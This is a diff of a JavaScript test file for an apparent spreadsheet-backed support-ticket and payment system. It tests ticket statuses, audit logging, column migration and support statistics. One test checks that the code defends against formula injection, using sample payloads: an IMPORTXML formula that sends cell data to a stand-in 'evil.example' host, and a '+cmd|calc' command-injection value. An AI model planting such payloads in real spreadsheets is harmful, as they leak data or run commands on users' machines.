@@ -1683,19 +1683,23 @@ test('createTicket opens a ticket and a repeated delivery does not open a second
   assert.equal(script.book().getSheetByName('Support').getLastRow(), 2, 'header plus one ticket');
 });
 
-test('appendTicketMessage grows the thread and moves the status', () => {
+test('appendTicketMessage grows the thread; an admin message picks the ticket up, a student one never closes it', () => {
   const script = freshScript();
   script.createTicket(newTicket());
 
-  const answered = script.appendTicketMessage('T-260917-AB2C', 'Admin @helper', 'Resent your link', 'answered', '@helper');
-  assert.equal(answered.status, 'answered');
+  const answered = script.appendTicketMessage('T-260917-AB2C', 'Admin @helper', 'Resent your link', '', '@helper');
+  assert.equal(answered.status, 'in_progress');
+  assert.equal(answered.waiting_on, 'student');
   assert.equal(answered.last_message, 'Resent your link');
   assert.equal(answered.handled_by, '@helper');
+  assert.equal(answered.picked_up_by, '@helper');
+  assert.ok(answered.first_reply_at);
   assert.match(answered.conversation, /I paid but got no link[\s\S]*Admin @helper:\nResent your link/);
 
-  // An unrecognised status leaves the current one alone.
-  const kept = script.appendTicketMessage('T-260917-AB2C', 'A Student', 'thanks', 'bogus');
-  assert.equal(kept.status, 'answered');
+  // A caller asking for "closed" through a message is ignored: only setTicketStatus closes.
+  const student = script.appendTicketMessage('T-260917-AB2C', 'A Student', 'thanks', 'closed');
+  assert.equal(student.status, 'in_progress');
+  assert.equal(student.waiting_on, 'admin');
 
   assert.equal(script.appendTicketMessage('T-000000-NONE', 'x', 'y'), null);
 });
@@ -1792,24 +1796,27 @@ test('the support actions are routed over HTTP and still require the token', () 
 // Support Log, ticket columns and coupons
 // ===========================================================================
 
-test('every ticket action is written to the Support Log with who did it', () => {
+test('every ticket action is written to the Support Log with who did it and the status after', () => {
   const script = freshScript();
   script.createTicket(newTicket());
-  script.appendTicketMessage('T-260917-AB2C', 'Admin @ravi', 'Resent the link', 'answered', '@ravi', 'invite_sent');
-  script.appendTicketMessage('T-260917-AB2C', 'A Student', 'thanks, in now', 'open');
+  script.appendTicketMessage('T-260917-AB2C', 'A Student', 'still waiting');
   script.logTicketEvent('T-260917-AB2C', '@ravi', 'admin', 'payment_checked', 'pay_1 captured ₹199');
+  script.appendTicketMessage('T-260917-AB2C', 'Admin @ravi', 'Resent the link', '', '@ravi', 'invite_sent');
+  script.appendTicketMessage('T-260917-AB2C', 'A Student', 'in now, thanks');
   script.setTicketStatus('T-260917-AB2C', 'closed', '@ravi');
-  script.appendTicketMessage('T-260917-AB2C', 'A Student', 'one more thing', 'open');
+  script.appendTicketMessage('T-260917-AB2C', 'A Student', 'one more thing');
 
   const log = script.getTicket('T-260917-AB2C').log;
   assert.deepEqual(Array.from(log, (e) => [e.who, e.role, e.action, e.status_after]), [
     ['@student', 'student', 'ticket_opened', 'open'],
-    ['@ravi', 'admin', 'invite_sent', 'answered'],
     ['A Student', 'student', 'student_message', 'open'],
-    ['@ravi', 'admin', 'payment_checked', 'open'],
+    ['@ravi', 'admin', 'picked_up', 'in_progress'],
+    ['@ravi', 'admin', 'payment_checked', 'in_progress'],
+    ['@ravi', 'admin', 'invite_sent', 'in_progress'],
+    ['A Student', 'student', 'student_message', 'in_progress'],
     ['@ravi', 'admin', 'closed', 'closed'],
-    ['A Student', 'student', 'student_message', 'open'],
-    ['A Student', 'student', 'reopened', 'open']
+    ['A Student', 'student', 'reopened', 'in_progress'],
+    ['A Student', 'student', 'student_message', 'in_progress']
   ]);
 });
 
@@ -1833,28 +1840,46 @@ test('the ticket row tracks admin replies and who closed it', () => {
   assert.equal(ticket.closed_at, '');
 });
 
-test('a Support tab from before the new columns gets them, and its rows still read', () => {
+test('a Support tab from an older version is upgraded: new columns, answered → in_progress, rows filled in', () => {
   const oldHeaders = ['Ticket ID', 'Created At', 'Updated At', 'Telegram ID', 'Username', 'Name',
-    'Category', 'Status', 'Bot', 'Last Message', 'Conversation', 'Handled By'];
+    'Category', 'Status', 'Bot', 'Last Message', 'Conversation', 'Handled By', 'Admin Replies', 'Last Admin Reply At',
+    'Closed At', 'Closed By'];
   const old = new FakeSheet('Support', [
     oldHeaders,
-    ['T-260917-OLD1', 'x', 'x', '42', 'asha', 'Asha', 'invite', 'open', 'TELEGRAM_PAYBOT_UPSC', 'hi', '[t] a:\nhi', '']
+    ['T-260917-OLD1', 'x', 'x', '42', 'asha', 'Asha', 'invite', 'open', 'TELEGRAM_PAYBOT_UPSC', 'hi', '[t] a:\nhi', '', 0, '', '', ''],
+    ['T-260917-OLD2', 'x', 'x', '43', 'ravi', 'Ravi', 'payment', 'answered', 'TELEGRAM_PAYBOT_UPSC', 'sent', '', '@sita', 2, '17-09-2026, 10:00:00 AM IST', '', ''],
+    ['T-260917-OLD3', 'x', 'x', '44', '', '', 'other', 'closed', 'TELEGRAM_PAYBOT_UPSC', 'ok', '', '@sita', 1, 'y', 'z', '@sita']
   ]);
   const script = loadScript(new FakeSpreadsheet([old]));
 
-  const ticket = script.getTicket('T-260917-OLD1');
-  assert.equal(ticket.status, 'open');
-  assert.equal(ticket.admin_replies, 0);
-  assert.equal(old.values[0].length, script.SUPPORT_HEADERS.length, 'the new headers were not added');
-  assert.equal(old.values[0][15], 'Closed By');
-  assert.match(old.notes['1,8'], /answered = Waiting for the student/);
+  const first = script.getTicket('T-260917-OLD1');
+  assert.equal(first.status, 'open');
+  assert.equal(first.waiting_on, 'admin');
+
+  const second = script.getTicket('T-260917-OLD2');
+  assert.equal(second.status, 'in_progress');
+  assert.equal(second.waiting_on, 'student');
+  assert.equal(second.picked_up_by, '@sita');
+  assert.equal(second.first_reply_at, '17-09-2026, 10:00:00 AM IST');
+  assert.equal(old.values[2][7], 'in_progress', 'the stored status must be migrated, not only read differently');
+
+  const third = script.getTicket('T-260917-OLD3');
+  assert.equal(third.status, 'closed');
+  assert.equal(third.waiting_on, '');
+
+  assert.equal(old.values[0].length, script.SUPPORT_HEADERS.length);
+  assert.equal(old.values[0][16], 'Waiting On');
+  assert.match(old.notes['1,8'], /in_progress = In progress/);
+  assert.match(old.notes['1,17'], /admin = the student wrote last/);
 });
 
-test('an admin can start a conversation, which opens as waiting for the student', () => {
+test('an admin can start a conversation, which starts in progress and waiting for the student', () => {
   const script = freshScript();
   const ticket = script.createTicket(newTicket({ opened_by: '@ravi', message: 'Your pass is ready' }));
-  assert.equal(ticket.status, 'answered');
+  assert.equal(ticket.status, 'in_progress');
+  assert.equal(ticket.waiting_on, 'student');
   assert.equal(ticket.admin_replies, 1);
+  assert.equal(ticket.picked_up_by, '@ravi');
   assert.match(ticket.conversation, /Admin @ravi:\nYour pass is ready/);
   assert.equal(script.getTicket(ticket.ticket_id).log[0].action, 'admin_started_conversation');
 });
@@ -1951,4 +1976,169 @@ test('the coupon actions are routed over HTTP behind the token', () => {
   } finally {
     delete scriptProperties.API_TOKEN;
   }
+});
+
+// ===========================================================================
+// Ticket lifecycle: open → in_progress → closed, and only an admin closes
+// ===========================================================================
+
+test('a new ticket is open and waiting on an admin until an admin acts', () => {
+  const script = freshScript();
+  const ticket = script.createTicket(newTicket());
+  assert.equal(ticket.status, 'open');
+  assert.equal(ticket.waiting_on, 'admin');
+  assert.equal(ticket.picked_up_by, '');
+
+  const followUp = script.appendTicketMessage('T-260917-AB2C', 'A Student', 'hello?');
+  assert.equal(followUp.status, 'open', 'a student writing again must not change open');
+});
+
+test('a non-message admin action picks the ticket up but keeps it waiting on the admin', () => {
+  const script = freshScript();
+  script.createTicket(newTicket());
+  const checked = script.logTicketEvent('T-260917-AB2C', '@ravi', 'admin', 'payment_checked', 'pay_1 failed');
+  assert.equal(checked.status, 'in_progress');
+  assert.equal(checked.picked_up_by, '@ravi');
+  assert.equal(checked.waiting_on, 'admin', 'the student has not been told anything yet');
+  assert.equal(checked.first_reply_at, '');
+
+  // Picked up once; a second admin does not replace who picked it up.
+  script.appendTicketMessage('T-260917-AB2C', 'Admin @sita', 'hi', '', '@sita');
+  assert.equal(script.getTicket('T-260917-AB2C').picked_up_by, '@ravi');
+});
+
+test('only an explicit close closes; closing twice changes nothing', () => {
+  const script = freshScript();
+  script.createTicket(newTicket());
+  script.appendTicketMessage('T-260917-AB2C', 'Admin @ravi', 'done?', '', '@ravi');
+  script.appendTicketMessage('T-260917-AB2C', 'A Student', 'yes, solved');
+  assert.equal(script.getTicket('T-260917-AB2C').status, 'in_progress', 'a student saying solved must not close it');
+
+  const closed = script.setTicketStatus('T-260917-AB2C', 'closed', '@ravi');
+  assert.equal(closed.status, 'closed');
+  assert.equal(closed.waiting_on, '');
+  assert.equal(closed.closed_by, '@ravi');
+  assert.ok(closed.closed_at);
+
+  const again = script.setTicketStatus('T-260917-AB2C', 'closed', '@sita');
+  assert.equal(again.closed_by, '@ravi', 'a second close must not rewrite who closed it');
+  assert.equal(script.getTicket('T-260917-AB2C').log.filter((e) => e.action === 'closed').length, 1);
+});
+
+test('closing a ticket nobody picked up records the closer as the one who picked it up', () => {
+  const script = freshScript();
+  script.createTicket(newTicket());
+  const closed = script.setTicketStatus('T-260917-AB2C', 'closed', '@ravi');
+  assert.equal(closed.picked_up_by, '@ravi');
+});
+
+test('a closed ticket reopens as in progress, waiting on an admin, when the student writes again', () => {
+  const script = freshScript();
+  script.createTicket(newTicket());
+  script.appendTicketMessage('T-260917-AB2C', 'Admin @ravi', 'fixed', '', '@ravi');
+  script.setTicketStatus('T-260917-AB2C', 'closed', '@ravi');
+
+  const reopened = script.appendTicketMessage('T-260917-AB2C', 'A Student', 'broken again');
+  assert.equal(reopened.status, 'in_progress');
+  assert.equal(reopened.waiting_on, 'admin');
+  assert.equal(reopened.times_reopened, 1);
+  assert.equal(reopened.closed_by, '');
+  assert.equal(reopened.closed_at, '');
+});
+
+test('an admin reopening a closed ticket makes it in progress and waiting on an admin; "open" is treated as reopen', () => {
+  const script = freshScript();
+  script.createTicket(newTicket());
+  script.setTicketStatus('T-260917-AB2C', 'closed', '@ravi');
+  const reopened = script.setTicketStatus('T-260917-AB2C', 'open', '@sita');
+  assert.equal(reopened.status, 'in_progress');
+  assert.equal(reopened.waiting_on, 'admin');
+  assert.equal(reopened.times_reopened, 1);
+  assert.throws(() => script.setTicketStatus('T-260917-AB2C', 'deleted', '@x'), /Status must be one of/);
+  assert.equal(script.setTicketStatus('T-000000-NONE', 'closed', '@x'), null);
+});
+
+test('listTickets counts every queue and filters by who has to act, longest waiting first', () => {
+  const script = freshScript();
+  script.createTicket(newTicket({ ticket_id: 'T-260917-AAAA', telegram_id: '1' }));
+  script.createTicket(newTicket({ ticket_id: 'T-260917-BBBB', telegram_id: '2' }));
+  script.createTicket(newTicket({ ticket_id: 'T-260917-CCCC', telegram_id: '3' }));
+  script.appendTicketMessage('T-260917-BBBB', 'Admin @r', 'hi', '', '@r');
+  script.setTicketStatus('T-260917-CCCC', 'closed', '@r');
+
+  const all = script.listTickets({});
+  assert.deepEqual({ ...all.counts }, { open: 1, in_progress: 1, closed: 1, total: 3, needs_reply: 1, waiting_student: 1 });
+  assert.deepEqual(Array.from(script.listTickets({ waitingOn: 'admin' }).tickets, (t) => t.ticket_id), ['T-260917-AAAA']);
+  assert.deepEqual(Array.from(script.listTickets({ status: 'answered' }).tickets, (t) => t.ticket_id), ['T-260917-BBBB'],
+    'the old status name still filters');
+  assert.equal(script.listTickets({ waitingOn: 'admin', sort: 'waiting' }).total, 1);
+});
+
+test('getSupportStats reports queues, today, response times, categories and each admin', () => {
+  const script = freshScript();
+  script.createTicket(newTicket({ ticket_id: 'T-260917-AAAA', telegram_id: '1', category: 'payment' }));
+  script.createTicket(newTicket({ ticket_id: 'T-260917-BBBB', telegram_id: '2', category: 'invite' }));
+  script.createTicket(newTicket({ ticket_id: 'T-260917-CCCC', telegram_id: '3', category: 'invite' }));
+  script.appendTicketMessage('T-260917-BBBB', 'Admin @ravi', 'hi', '', '@ravi');
+  script.appendTicketMessage('T-260917-CCCC', 'Admin @sita', 'done', '', '@sita', 'quick_reply:qr_resolved');
+  script.setTicketStatus('T-260917-CCCC', 'closed', '@sita');
+
+  const stats = script.getSupportStats({ days: 30 });
+  assert.equal(stats.counts.total, 3);
+  assert.equal(stats.counts.open, 1);
+  assert.equal(stats.counts.in_progress, 1);
+  assert.equal(stats.counts.closed, 1);
+  assert.equal(stats.counts.needs_reply, 1);
+  assert.equal(stats.not_picked_up, 1);
+  assert.equal(stats.opened_today, 3);
+  assert.equal(stats.closed_today, 1);
+  assert.equal(stats.first_reply_minutes.samples, 2);
+  assert.equal(stats.close_hours.samples, 1);
+  assert.equal(stats.oldest_needs_reply.ticket_id, 'T-260917-AAAA');
+  assert.deepEqual({ ...stats.by_category.invite }, { open: 0, in_progress: 1, closed: 1, total: 2 });
+  assert.equal(stats.by_admin['@ravi'].replies, 1);
+  assert.equal(stats.by_admin['@ravi'].picked_up, 1);
+  assert.equal(stats.by_admin['@sita'].quick_replies, 1);
+  assert.equal(stats.by_admin['@sita'].closed, 1);
+});
+
+test('text a student controls can never become a formula in the sheet', () => {
+  const script = freshScript();
+  const evil = '=IMPORTXML("https://evil.example/?"&A1,"//x")';
+  script.createTicket(newTicket({ name: evil, username: '', message: '+cmd|calc' }));
+  script.appendTicketMessage('T-260917-AB2C', '-student', '@SUM(1)');
+  script.upsertSubscriber({ telegram_id: '99', name: evil, username: 'x', plan_label: '=1+1', notes: '-note', status: 'active' });
+
+  const support = script.book().getSheetByName('Support');
+  const stored = support.values[1];
+  // The fake sheet strips the apostrophe on write, like Sheets, so check what was written.
+  const writtenName = script.safeCell(evil);
+  assert.equal(writtenName, "'" + evil);
+  assert.equal(script.safeCell('hello'), 'hello');
+  assert.equal(script.safeCell(5), 5);
+
+  // Read back, the values are exactly what the student sent.
+  const ticket = script.getTicket('T-260917-AB2C');
+  assert.equal(ticket.name, evil);
+  assert.equal(ticket.last_message, '@SUM(1)');
+  assert.equal(stored[5], evil);
+  const member = script.getSubscriber('99');
+  assert.equal(member.name, evil);
+  assert.equal(member.plan_label, '=1+1');
+
+  const logWho = script.book().getSheetByName('Support Log').values.slice(1).map((r) => r[3]);
+  assert.ok(logWho.every((v) => typeof v === 'string'));
+});
+
+test('findPaymentRecord finds a payment in the log first, then on a member row', () => {
+  const script = freshScript();
+  script.logPayment({ telegram_id: '42', plan: 'exam_pass', amount: 199, payment_id: 'pay_LOGGED000001', event: 'payment_link.paid' });
+  script.upsertSubscriber({ telegram_id: '43', status: 'active', payment_id: 'pay_ONROW0000001', amount: 199 });
+
+  assert.equal(script.findPaymentRecord('pay_LOGGED000001').telegram_id, '42');
+  assert.equal(script.findPaymentRecord('pay_LOGGED000001').source, 'Payments');
+  assert.equal(script.findPaymentRecord('pay_ONROW0000001').telegram_id, '43');
+  assert.equal(script.findPaymentRecord('pay_ONROW0000001').source, 'Subscribers');
+  assert.equal(script.findPaymentRecord('pay_NOWHERE00001'), null);
+  assert.equal(script.findPaymentRecord(''), null);
 });
